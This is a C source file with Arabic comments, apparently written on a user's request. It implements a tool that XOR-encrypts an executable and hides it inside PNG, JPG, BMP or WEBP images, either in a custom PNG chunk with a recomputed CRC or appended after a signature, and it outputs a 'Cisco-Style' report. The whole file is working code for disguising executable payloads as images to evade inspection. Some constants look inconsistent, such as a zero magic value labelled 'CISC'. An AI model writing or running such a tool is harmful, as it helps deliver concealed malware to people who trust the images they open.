#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <time.h>

// --- إعدادات أمنية متقدمة ---
#define SECRET_MAGIC 0x00000000 // "CISC"
const char *SIGNATURE = "0x0,0x0,0x1,0x1,0x1,0x1,0x0,0x1,0x1,0x0,0x0,0x1,0x0,0x0,0x0,0x0,0x0,0x1,0x0,0x0,0x1,0x1,0x0,0x1,0x1,0x1,0x0,0x0,0x1,0x1,0x1,0x1,0x0,0x0,0x0,0x0,0x1,0x1,0x0,0x0,0x1,0x0,0x0,0x1,0x0,0x1,0x0,0x1,0x0,0x0,0x0,0x1";

typedef struct {
    uint32_t magic;
    uint32_t payload_sz;
    uint8_t  xor_key;
} HiddenHeader;

uint32_t crc_table[256];
void init_crc_table() {
    for (int n = 0; n < 256; n++) {
        uint32_t c = (uint32_t)n;
        for (int k = 0; k < 8; k++) {
            if (c & 1) c = 0xedb88320L ^ (c >> 1);
            else c = c >> 1;
        }
        crc_table[n] = c;
    }
}

uint32_t update_crc(uint32_t crc, unsigned char *buf, size_t len) {
    uint32_t c = crc ^ 0xffffffffL;
    for (size_t n = 0; n < len; n++) c = crc_table[(c ^ buf[n]) & 0xff] ^ (c >> 8);
    return c ^ 0xffffffffL;
}

void xor_cipher(unsigned char *data, size_t len, uint8_t key) {
    for (size_t i = 0; i < len; i++) data[i] ^= key;
}

// --- التعامل مع الملفات (من نسختك الأصلية) ---
typedef enum { IMG_PNG, IMG_JPG, IMG_BMP, IMG_WEBP, IMG_UNKNOWN } ImageType;

ImageType detect_image_type(const unsigned char *data, size_t size) {
    if (size >= 8 && memcmp(data, "\x89PNG\r\n\x1a\n", 8) == 0) return IMG_PNG;
    if (size >= 3 && memcmp(data, "\xFF\xD8\xFF", 3) == 0) return IMG_JPG;
    if (size >= 2 && memcmp(data, "BM", 2) == 0) return IMG_BMP;
    if (size >= 12 && memcmp(data, "RIFF", 4) == 0 && memcmp(data+8, "WEBP", 4) == 0) return IMG_WEBP;
    return IMG_UNKNOWN;
}

// --- حقن PNG مع التشفير والـ CRC ---
unsigned char* inject_png(const unsigned char *png, size_t p_size, const unsigned char *exe, size_t e_size, uint8_t key, size_t *out_sz) {
    size_t pos = 8;
    while (pos + 12 < p_size) {
        uint32_t len = (png[pos]<<24)|(png[pos+1]<<16)|(png[pos+2]<<8)|png[pos+3];
        if (memcmp(png + pos + 4, "IEND", 4) == 0) break;
        pos += 12 + len;
    }

    HiddenHeader h = { SECRET_MAGIC, (uint32_t)e_size, key };
    unsigned char *enc_exe = malloc(e_size);
    memcpy(enc_exe, exe, e_size);
    xor_cipher(enc_exe, e_size, key);

    size_t data_sz = sizeof(HiddenHeader) + e_size;
    *out_sz = p_size + 12 + data_sz;
    unsigned char *out = malloc(*out_sz);

    memcpy(out, png, pos);
    uint32_t n_len = __builtin_bswap32(data_sz);
    memcpy(out + pos, &n_len, 4);
    memcpy(out + pos + 4, "exEX", 4);
    memcpy(out + pos + 8, &h, sizeof(HiddenHeader));
    memcpy(out + pos + 8 + sizeof(HiddenHeader), enc_exe, e_size);

    uint32_t crc = update_crc(0xffffffffL, (unsigned char*)"exEX", 4);
    crc = update_crc(crc, out + pos + 8, data_sz);
    uint32_t n_crc = __builtin_bswap32(crc);
    memcpy(out + pos + 8 + data_sz, &n_crc, 4);
    memcpy(out + pos + 12 + data_sz, png + pos, p_size - pos);

    free(enc_exe); return out;
}

// --- حقن Append (JPG/BMP/WEBP) مع التشفير ---
unsigned char* inject_append(const unsigned char *img, size_t i_sz, const unsigned char *exe, size_t e_sz, uint8_t key, size_t *out_sz) {
    HiddenHeader h = { SECRET_MAGIC, (uint32_t)e_sz, key };
    unsigned char *enc_exe = malloc(e_sz);
    memcpy(enc_exe, exe, e_sz);
    xor_cipher(enc_exe, e_sz, key);

    *out_sz = i_sz + strlen(SIGNATURE) + sizeof(HiddenHeader) + e_sz;
    unsigned char *out = malloc(*out_sz);
    memcpy(out, img, i_sz);
    memcpy(out + i_sz, SIGNATURE, strlen(SIGNATURE));
    memcpy(out + i_sz + strlen(SIGNATURE), &h, sizeof(HiddenHeader));
    memcpy(out + i_sz + strlen(SIGNATURE) + sizeof(HiddenHeader), enc_exe, e_sz);

    free(enc_exe); return out;
}

// --- نظام التقارير (الذي طلبته) ---
void create_report(const char *path, const char *img_p, const char *exe_p, ImageType type, size_t sz, uint8_t key) {
    FILE *r = fopen(path, "w");
    fprintf(r, "=== Advanced Cisco-Style Security Report ===\n");
    fprintf(r, "Source Image: %s\nPayload: %s\n", img_p, exe_p);
    fprintf(r, "Detected Type: %d\nXOR Encryption Key: 0x%02X\n", type, key);
    fprintf(r, "Status: INJECTED SUCCESSFULLY\n");
    fclose(r);
}

int main(int argc, char *argv[]) {
    if (argc < 5) return printf("Usage: %s <img> <exe> <out> <report>\n", argv[0]), 1;
    init_crc_table();
    srand(time(NULL));
    uint8_t key = rand() % 254 + 1;

    size_t i_sz, e_sz, o_sz;
    FILE *fi = fopen(argv[1], "rb"); fseek(fi, 0, SEEK_END); i_sz = ftell(fi); rewind(fi);
    unsigned char *i_data = malloc(i_sz); fread(i_data, 1, i_sz, fi); fclose(fi);

    FILE *fe = fopen(argv[2], "rb"); fseek(fe, 0, SEEK_END); e_sz = ftell(fe); rewind(fe);
    unsigned char *e_data = malloc(e_sz); fread(e_data, 1, e_sz, fe); fclose(fe);

    ImageType type = detect_image_type(i_data, i_sz);
    unsigned char *final_data = (type == IMG_PNG) ? 
        inject_png(i_data, i_sz, e_data, e_sz, key, &o_sz) : 
        inject_append(i_data, i_sz, e_data, e_sz, key, &o_sz);

    FILE *fo = fopen(argv[3], "wb"); fwrite(final_data, 1, o_sz, fo); fclose(fo);
    create_report(argv[4], argv[1], argv[2], type, e_sz, key);

    printf("[+] Process Complete. Report saved to: %s\n", argv[4]);
    return 0;
}